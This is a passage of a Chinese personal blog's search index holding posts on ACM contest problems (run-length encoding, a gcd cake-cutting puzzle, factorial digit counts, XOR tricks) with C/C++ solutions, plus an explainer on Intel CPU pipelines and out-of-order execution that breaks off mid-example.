<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title><![CDATA[ACM日常训练总结(一)]]></title>
      <url>/2018/03/13/ACM%E6%97%A5%E5%B8%B8%E8%AE%AD%E7%BB%83%E6%80%BB%E7%BB%93-%E4%B8%80/</url>
      <content type="html"><![CDATA[<p>日常训练中感觉有些坑的题目大结集～</p>
<a id="more"></a>
<h1 id="Encoding"><a href="#Encoding" class="headerlink" title="Encoding"></a>Encoding</h1><p><a href="http://acm.hdu.edu.cn/showproblem.php?pid=1020" target="_blank" rel="external">传送门</a></p>
<p><strong>Problem Description</strong></p>
<p>Given a string containing only ‘A’ - ‘Z’, we could encode it using the following method: </p>
<ol>
<li>Each sub-string containing k same characters should be encoded to “kX” where “X” is the only character in this sub-string.</li>
<li>If the length of the sub-string is 1, ‘1’ should be ignored.</li>
</ol>
<p><strong>Input</strong></p>
<p>The first line contains an integer N (1 &lt;= N &lt;= 100) which indicates the number of test cases. The next N lines contain N strings. Each string consists of only ‘A’ - ‘Z’ and the length is less than 10000. </p>
<p><strong>Output</strong></p>
<p>For each test case, output the encoded string in a line </p>
<p><strong>Sample Input</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">2 ABC ABBCCC</div></pre></td></tr></table></figure>
<p><strong>Sample Output</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ABC A2B3C</div></pre></td></tr></table></figure>
<p>这个题目坑的地方主要在与你要理解清楚它是把每个子串做加密，而不是最后把相同的字母统计然后输出，我一开始以为的是统计整个序列中每个字符的个数输出，所以写的代码如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</div><div class="line">  <span class="keyword">int</span> N;</div><div class="line">  <span class="keyword">char</span> ch;</div><div class="line">  <span class="keyword">int</span> flag=<span class="number">1</span>;</div><div class="line">  <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;N);</div><div class="line">  <span class="keyword">while</span>(N--)&#123;</div><div class="line">    <span class="keyword">int</span> a[<span class="number">30</span>]=&#123;<span class="number">0</span>&#125;;</div><div class="line">    <span class="keyword">if</span>(flag) &#123;getchar(); flag=<span class="number">0</span>;&#125;</div><div class="line">    <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</div><div class="line">    ch=getchar();</div><div class="line">    <span class="keyword">if</span>(ch == <span class="string">'\n'</span>) <span class="keyword">break</span>;</div><div class="line">    <span class="keyword">else</span>&#123;</div><div class="line">      a[ch<span class="number">-65</span>] += <span class="number">1</span>;</div><div class="line">    &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i&lt; <span class="number">26</span> ; i++)&#123;</div><div class="line">      <span class="keyword">if</span>(a[i]==<span class="number">1</span>) <span class="built_in">cout</span> &lt;&lt; <span class="keyword">char</span>(i+<span class="number">65</span>);</div><div class="line">      <span class="keyword">else</span> <span class="keyword">if</span>(a[i] &gt; <span class="number">1</span>) <span class="built_in">cout</span> &lt;&lt; a[i] &lt;&lt; <span class="keyword">char</span>(i+<span class="number">65</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p> 因为HDU上面没有多的测试样例可以看，所以一开始错了好几次，后来才发现是<code>Each-substring</code>，所以用C++中的string类来做就比较简单了：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;  </span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;  </span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;  </span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;  </span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;  </span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;  </div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span>  </span></div><div class="line">&#123;  </div><div class="line">    <span class="keyword">int</span> t;  </div><div class="line">    <span class="built_in">string</span> s;  </div><div class="line">    <span class="built_in">cin</span>&gt;&gt;t;  </div><div class="line">    getchar();  </div><div class="line">    <span class="keyword">while</span>(t--)  </div><div class="line">    &#123;  </div><div class="line">        <span class="built_in">cin</span>&gt;&gt;s;  </div><div class="line">        <span class="keyword">int</span> len=s.size();  </div><div class="line">        <span class="keyword">int</span> ans=<span class="number">1</span>;<span class="comment">///用ans来记录字符出现的次数  </span></div><div class="line">        <span class="keyword">int</span> temp=s[<span class="number">0</span>];<span class="comment">///用temp来存储第一个字符  </span></div><div class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;=len; i++)<span class="comment">///将temp与后边的字符进行比较，相同的ans++  </span></div><div class="line">        &#123;  </div><div class="line">            <span class="keyword">if</span>(s[i]!=temp)  </div><div class="line">            &#123;  </div><div class="line">                <span class="keyword">if</span>(ans==<span class="number">1</span>)<span class="comment">///如果次数为1，忽略1，直接输出  </span></div><div class="line">                &#123;  </div><div class="line">                    <span class="built_in">cout</span>&lt;&lt;s[i<span class="number">-1</span>];  </div><div class="line">                    temp=s[i];  </div><div class="line">                &#125;  </div><div class="line">                <span class="keyword">else</span>  </div><div class="line">                &#123;  </div><div class="line">                    <span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;s[i<span class="number">-1</span>];  </div><div class="line">                    temp=s[i];  </div><div class="line">                    ans=<span class="number">1</span>;  </div><div class="line">                &#125;  </div><div class="line">            &#125;  </div><div class="line">            <span class="keyword">else</span>  </div><div class="line">                ans++;  </div><div class="line">        &#125;  </div><div class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;  </div><div class="line">    &#125;  </div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </div><div class="line">&#125;</div></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> 日常练手 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> ACM </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[ACM数论上的难题]]></title>
      <url>/2018/03/13/ACM%E6%95%B0%E8%AE%BA%E4%B8%8A%E7%9A%84%E9%9A%BE%E9%A2%98/</url>
      <content type="html"><![CDATA[<p>比赛中没有那么多的时间去对每一个数学问题进行相关的公式推导，所以这里记载一些可能会用到而又不是板子的题目</p>
<a id="more"></a>
<h1 id="Cake"><a href="#Cake" class="headerlink" title="Cake"></a>Cake</h1><p><a href="http://acm.hdu.edu.cn/game/entry/problem/show.php?chapterid=2&amp;sectionid=1&amp;problemid=4" target="_blank" rel="external">传送门</a></p>
<p><strong>Problem</strong> <strong>Description</strong></p>
<p>一次生日Party可能有p人或者q人参加,现准备有一个大蛋糕.问最少要将蛋糕切成多少块(每块大小不一定相等),才能使p人或者q人出席的任何一种情况,都能平均将蛋糕分食. </p>
<p><strong>Input</strong></p>
<p>每行有两个数p和q.</p>
<p><strong>Output</strong></p>
<p>输出最少要将蛋糕切成多少块.</p>
<p><strong>Sample Input</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">2 3</div></pre></td></tr></table></figure>
<p>2 3 </p>
<p><strong>Sample Output</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">4</div></pre></td></tr></table></figure>
<p><strong>Hint</strong></p>
<p>将蛋糕切成大小分别为1/3,1/3,1/6,1/6的四块即满足要求. 当2个人来时，每人可以吃1/3+1/6=1/2 , 1/2块。 当3个人来时，每人可以吃1/6+1/6=1/3 , 1/3, 1/3块。</p>
<p>这个题主要是要从几何的角度出发去找规律，这样就会比较好想一点：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-03-13%20%E4%B8%8B%E5%8D%884.16.52.png" alt="屏幕快照 2018-03-13 下午4.16.52.png" title="" class="">
                <p>屏幕快照 2018-03-13 下午4.16.52.png</p>
            </figure>
<p>假设p=6,q=4，那么就如上图所示，切割痕迹重合后的线条数就是最小的切割次数。4与6的最大公约数是2，也就是说有一条线会重合，见上图。</p>
<p>而4和6的切割线数量分别是3和5,二者之和减去重合的那条线结果就是7条分割线，而7条线便将蛋糕分成了8块。</p>
<p>再看8和4,分割线是7和3,重合数是最大公约数减1为3，因此由(p+q-2)-gcd(p,q)-1得到不重合的切割线数是7,即最小块数为8。所以答案就是p+q-gcd(p,q)。</p>
<p>用代码表示就是一个gcd，然后输出即可：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">gcd</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>&#123;</div><div class="line">  <span class="keyword">return</span> b ? gcd(b, a%b) : a;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line">&#123;</div><div class="line">        <span class="keyword">int</span> p,q;</div><div class="line">        <span class="keyword">while</span>(~<span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;p,&amp;q))</div><div class="line">        &#123;</div><div class="line">        	<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,p+q-gcd(p,q));</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h1 id="Big-Number"><a href="#Big-Number" class="headerlink" title="Big Number"></a>Big Number</h1><p><a href="http://acm.hdu.edu.cn/showproblem.php?pid=1018" target="_blank" rel="external">传送门</a></p>
<p><strong>Problem</strong> <strong>Description</strong></p>
<p>In many applications very large integers numbers are required. Some of these applications are using keys for secure transmission of data, encryption, etc. In this problem you are given a number, you have to determine the number of digits in the factorial of the number. </p>
<p><strong>Input</strong></p>
<p>Input consists of several lines of integer numbers. The first line contains an integer n, which is the number of cases to be tested, followed by n lines, one integer 1 ≤ n ≤ 107 on each line.</p>
<p><strong>Output</strong></p>
<p>The output contains the number of digits in the factorial of the integers appearing in the input.</p>
<p><strong>Sample</strong> <strong>Input</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">2</div><div class="line">10</div><div class="line">20</div></pre></td></tr></table></figure>
<p><strong>Sample</strong> <strong>Output</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">7</div><div class="line">19</div></pre></td></tr></table></figure>
<p>因为我们求的是十进制的数的位数，所以我们可以使用<code>log10()</code>函数来求解，将n!表示成10的次幂,即n!=10^M(10的M次方，10^2是3位，M+1就代表位数)则不小于M的最小整数就是n!的位数，对该式两边取对数，有M=log10^n!即：  </p>
<blockquote>
<p>M = log10^1+log10^2+log10^3…+log10^n</p>
</blockquote>
<p>循环求和,就能算得M值，该M是n!的精确位数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line"> <span class="keyword">int</span> count,var,j;</div><div class="line"> <span class="keyword">double</span> sum;</div><div class="line"> <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;count);</div><div class="line"> <span class="keyword">while</span>(count--)</div><div class="line"> &#123;</div><div class="line">  sum=<span class="number">0</span>;</div><div class="line">  <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;var);</div><div class="line">  <span class="keyword">for</span>(j=<span class="number">1</span>;j&lt;=var;j++)</div><div class="line">   sum+=<span class="built_in">log10</span>(j);</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,(<span class="keyword">int</span>)sum+<span class="number">1</span>);</div><div class="line"> &#125;</div><div class="line"> <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>但是在这里我们利用组合数学可以做出一种更高效的解法，我们用到称作斯特林公式：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-03-13%20%E4%B8%8B%E5%8D%885.50.44.png" alt="屏幕快照 2018-03-13 下午5.50.44.png" title="" class="">
                <p>屏幕快照 2018-03-13 下午5.50.44.png</p>
            </figure>
<p>我们对于两边同取10的对数就可以得到一个新的等式，接下来就是编程实现了：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;  </span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;  </span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cmath&gt;  </span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;  </div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span>  </span></div><div class="line">&#123;  </div><div class="line">    <span class="keyword">int</span> n;  </div><div class="line">    <span class="keyword">int</span> N;  </div><div class="line">    <span class="keyword">int</span> ans;  </div><div class="line">    <span class="keyword">double</span> pi=<span class="built_in">acos</span>(<span class="number">-1.0</span>);  </div><div class="line">    <span class="keyword">double</span> e=<span class="built_in">exp</span>(<span class="number">1.0</span>);  </div><div class="line">    <span class="built_in">cin</span>&gt;&gt;N;  </div><div class="line">    <span class="keyword">while</span> (N--)  </div><div class="line">    &#123;  </div><div class="line">        <span class="built_in">cin</span>&gt;&gt;n;  </div><div class="line">        <span class="keyword">if</span>(n==<span class="number">1</span>)  </div><div class="line">        &#123;  </div><div class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="string">"1"</span>&lt;&lt;<span class="built_in">endl</span>;  </div><div class="line">            <span class="keyword">continue</span>;  </div><div class="line">        &#125;  </div><div class="line">        ans=(<span class="keyword">int</span>)(<span class="built_in">log10</span>(<span class="built_in">sqrt</span>(<span class="number">2</span>*pi*n))+n*<span class="built_in">log10</span>(n/e)+<span class="number">1</span>);  </div><div class="line">        <span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="built_in">endl</span>;  </div><div class="line">    &#125;  </div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </div><div class="line">&#125;</div></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> 数论 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> ACM </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[ACM之神奇的位运算]]></title>
      <url>/2018/03/12/ACM%E4%B9%8B%E7%A5%9E%E5%A5%87%E7%9A%84%E4%BD%8D%E8%BF%90%E7%AE%97/</url>
      <content type="html"><![CDATA[<p>位运算在很多领域中都有着广泛的应用，不管是在安全领域，如加解密，还是在开发领域，如寻址和嵌入式开发，还是在进行算法的优化上，都和位运算结合的非常紧密，今天就来看看ACM中巧妙用到位运算的一些经典题目吧。</p>
<h1 id="Find-your-present"><a href="#Find-your-present" class="headerlink" title="Find your present"></a>Find your present</h1><p><a href="http://acm.hdu.edu.cn/game/entry/problem/show.php?chapterid=1&amp;sectionid=2&amp;problemid=11" target="_blank" rel="external">传送门</a></p>
<p><strong>Problem Description</strong><br>In the new year party, everybody will get a “special present”.Now it’s your turn to get your special present, a lot of presents now putting on the desk, and only one of them will be yours.Each present has a card number on it, and your present’s card number will be the one that different from all the others, and you can assume that only one number appear odd times.For example, there are 5 present, and their card numbers are 1, 2, 3, 2, 1.so your present will be the one with the card number of 3, because 3 is the number that different from all the others.<br><strong>Input</strong><br>The input file will consist of several cases.<br>Each case will be presented by an integer n (1&lt;=n&lt;1000000, and n is odd) at first. Following that, n positive integers will be given in a line, all integers will smaller than 2^31. These numbers indicate the card numbers of the presents.n = 0 ends the input.<br><strong>Output</strong><br>For each case, output an integer in a line, which is the card number of your present.<br><strong>Sample Input</strong><br>5<br>1 1 3 2 2<br>3<br>1 2 1<br>0<br><strong>Sample Output</strong><br>3<br>2<br><strong>Hint</strong><br>use scanf to avoid Time Limit Exceeded</p>
<p>首先我们要知道异或的一些特性，然后看看能不解题有所启发：</p>
<ol>
<li>a^b = b^a</li>
<li>(a^b)^c = a^(b^c)</li>
<li>a^b^a = b</li>
<li>0^n = n</li>
<li>n^n = 0</li>
</ol>
<p>那么我们可以发现其实我们所要寻找的特殊礼物也就是在输入的数字序列中没有另一个与之相同的数字，那么可以利用第4、5条性质，因为相同的数字之间异或都为0，0和任意数异或都为这个数，那么只需要设定一个起始ans，初始化为0，然后遍历序列进行异或，最后的答案就显而易见了：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</div><div class="line">  <span class="keyword">int</span> n,ans,m;</div><div class="line">  <span class="keyword">while</span>(<span class="built_in">cin</span> &gt;&gt; n)&#123;</div><div class="line">    <span class="keyword">if</span>(n==<span class="number">0</span>) <span class="keyword">break</span>;</div><div class="line">    ans=<span class="number">0</span>;</div><div class="line">    <span class="keyword">while</span>(n--)&#123;</div><div class="line">      <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;m);</div><div class="line">      ans ^= m;</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, ans);</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> 位运算 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> ACM </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[浅谈CPU的流水线]]></title>
      <url>/2018/02/28/%E6%B5%85%E8%B0%88CPU%E7%9A%84%E6%B5%81%E6%B0%B4%E7%BA%BF/</url>
      <content type="html"><![CDATA[<p><img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-02-28%20%E4%B8%8B%E5%8D%885.01.23.png" height="350" width="600" alt=""></p>
<p>在学习系统结构的时候对于CPU的流水线机制有些不解，于是从Intel的历史开始看起，从早期没有流水线的i386到后来的Core架构的CPU中间所发生的更新换代来切入，来谈谈系统架构对于一个电脑到底有着怎么样的影响，just like the trick，以我昨天看的一部诺兰的电影作为配图hhh。</p>
<a id="more"></a>
<h1 id="CPU的发展"><a href="#CPU的发展" class="headerlink" title="CPU的发展"></a>CPU的发展</h1><p>因为是讲Intel的CPU架构，那么就不得不从8086开始说起，虽然这一代的CPU由于过渡的原因，存在着一些问题(计算地址偏移需要移位)，但是仍然是经典的一款。至今为止Intel推出了很多代的CPU架构，从早期的80386，到第奔腾，第酷睿，和最新的一代Haswell，性能上的上升也是很明显的：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-02-28%20%E4%B8%8B%E5%8D%884.08.02.png" alt="屏幕快照 2018-02-28 下午4.08.02.png" title="" class="">
                <p>屏幕快照 2018-02-28 下午4.08.02.png</p>
            </figure>
<p>经历了近四十年的风风雨雨，我们会发现其实在微机上，元器件所做的改变并不大，或者说CPU的主频并没有发生很大的变化，有时候甚至不生反降，但是处理器的多线程计算能力却是一直在上升，这其中的奥妙就要归功于我们的计算机系统结构的不断迭代了。</p>
<p>一开始的处理器设计太过于简单，就好比我们的单道批处理系统一样，根本不涉及到任何的调度算法，我们只需要把作业提交，就会串行的去执行。最初的8086处理器执行过程可以简述为从当前指令指针(IP)取到指令，通过译码，然后执行退出。站在早期的角度来考虑我们可能会考虑消除内存和处理器来回的时间消耗，事实也正是如此，在82年的时候指令缓存被加入到处理器中，通过指令缓存处理器可以一次性从内存读取更多指令并放在指令缓存中，而不用每条指令都从内存中取。指令缓存仅有几个字节大小，只能容纳数条指令，但是因为消除了之后每次取指往返内存和处理器的时间，极大的提高的效率。</p>
<p>1985年的386处理器引入了数据缓存，而且扩展了指令缓存的设计。数据访存请求通过一次性读取更多的数据放在数据缓存中，从而提升了性能。而且，数据缓存和指令缓存都从几个字节扩大到几千字节。</p>
<p>1989年推出的i486处理器引入了五级流水线。这时，在CPU中不再仅运行一条指令，每一级流水线在同一时刻都运行着不同的指令。这个设计使得i486比同频率的386处理器性能提升了不止一倍。五级流水线中的取指阶段将指令从指令缓存中取出（i486中的指令缓存为8KB）；第二级为译码阶段，将取出的指令翻译为具体的功能操作；第三级为转址阶段，用来将内存地址和偏移进行转换；第四级为执行阶段，指令在该阶段真正执行运算；第五级为退出阶段，运算的结果被写回寄存器或者内存。由于处理器同时运行了多条指令，大大提升了程序运行的性能。</p>
<p>1993年Intel推出了奔腾(Pentium)处理器。由于诉讼问题，Intel无法继续沿用原来的数字编号。因此，用奔腾替代了586作为新款处理器的代号。奔腾处理器相对i486处理器对流水线做出了更多修改。奔腾处理器架构增加了第二条独立的超标量流水线。主流水线工作方式类似于i486，第二条流水线则并行的运行一些较简单的指令，比如说定点算术，而且该流水线能更快的进行该运算。</p>
<p>1995年Intel推出了奔腾Pro(Pentium Pro)处理器。和之前的处理器相比，奔腾Pro采用了完全不同的设计。该处理器采用了诸多新特性以提高性能，包括乱序(Out-of-Order, OOO)执行的部件以及猜测执行。流水线扩展到了12级，而且引入了“超标量流水线”的概念，使得许多指令可以被同时处理。</p>
<p>…</p>
<p>直到2013年的时候，第四代微结构Haswell被推出，此时就已经拥有14级流水线的乱序执行部件了。</p>
<p>上文中的流水线和乱序执行部件搞得人眼花缭乱，但这并不是大事，接下来我们会做讲解。</p>
<h1 id="CPU指令流水线"><a href="#CPU指令流水线" class="headerlink" title="CPU指令流水线"></a>CPU指令流水线</h1><p>根据之前描述的基础，指令进入流水线，通过流水线处理，从流水线出来的过程，对于我们程序员来说，是比较直观的。</p>
<p>I486拥有五级流水线。分别是：取指(Fetch)，译码(D1, main decode)，转址(D2, translate)，执行(EX, execute)，写回(WB)。某个指令可以在流水线的任何一级。</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-02-28%20%E4%B8%8B%E5%8D%884.38.37.png" alt="屏幕快照 2018-02-28 下午4.38.37.png" title="" class="">
                <p>屏幕快照 2018-02-28 下午4.38.37.png</p>
            </figure>
<p>8086到386都没有流水线，所以就算执行有依赖关系的代码也是没有问题的，但是对于上图中的流水线来说，就有一个明显的缺陷，如果顺序执行的代码之间有依赖关系，也就是说前者完成后后者才能执行，举个例子就是说后者用到了前者计算的数据，这样就形成了一个必须的等待，这种情况下我们称作是流水线阻塞或者流水线气泡。</p>
<p>这样子的问题在奔腾处理器的双流水线架构下更加明显了，有的指令执行的快，有的指令要慢，如果形成上述的阻塞效果，会严重的影响执行的速度，所以Intel推出了完全不同的流水线设计——乱序执行部件(Out-of-Order core)，接下来再来看看Intel为此做出的改变。</p>
<h1 id="乱序执行流水线"><a href="#乱序执行流水线" class="headerlink" title="乱序执行流水线"></a>乱序执行流水线</h1><p>能够快速完成的指令需要等待前面执行慢的指令即使在并行流水线中也仍然是一个问题。流水线仍然是线性的，导致处理器面临性能瓶颈难以逾越。</p>
<p>于是我们引入了乱序执行流水线，乱序执行部件和之前处理器设计中的线性通路有很大不同，它增加了一些复杂度，引入了非线性的通路。</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-02-28%20%E4%B8%8B%E5%8D%885.03.56.png" alt="屏幕快照 2018-02-28 下午5.03.56.png" title="" class="">
                <p>屏幕快照 2018-02-28 下午5.03.56.png</p>
            </figure>
<p>不同于之前的取指、译码、执行等过程，乱序执行从一开始就做了一些改变：</p>
<ol>
<li>首先改变的是指令从内存中取到处理器的指令缓存的过程。现代处理器能够检测何时会产生一个大的分支跳转（比如函数调用），然后提前将跳转目的地的指令加载到指令缓存中。</li>
<li>译码级有一些略微的修改。不同于以往处理器仅仅译码指令指针指向的指令，奔腾Pro处理器每一个时钟周期最多能译码3条指令。现今的处理器（2008-2013年）每个时钟周期最多可以译码4条指令。译码过程产生很多小片的操作，被称作微指令(micro-ops, µ-ops)。</li>
<li>下一级（或者好几级）被称为微指令翻译，接着是寄存器重命名(register aliasing)。许多操作同时执行，并且执行的顺序是乱序的，所以有可能出现一条指令读一个寄存器的同时，另外一条指令正在对这个寄存器进行写操作。在处理器内部，这些原始的寄存器（如AX,BX,CX,DX等）被翻译（或者重命名）成为内部的寄存器，而这些寄存器对程序员是不可见的。寄存器和内存地址需要被映射到一个临时的地方用于指令执行。当前每个时钟周期可以翻译4条微指令。但是这样说可能还是不明白，那是因为首先要理解寄存器重命名的概念，接下来看看下面这个例子：</li>
</ol>
<table>
<thead>
<tr>
<th style="text-align:center">1. R1=M[1024]</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">2. R1=R1+2</td>
</tr>
<tr>
<td style="text-align:center">3. M[1032]=R1</td>
</tr>
<tr>
<td style="text-align:center">4. R1=M[2048]</td>
</tr>
<tr>
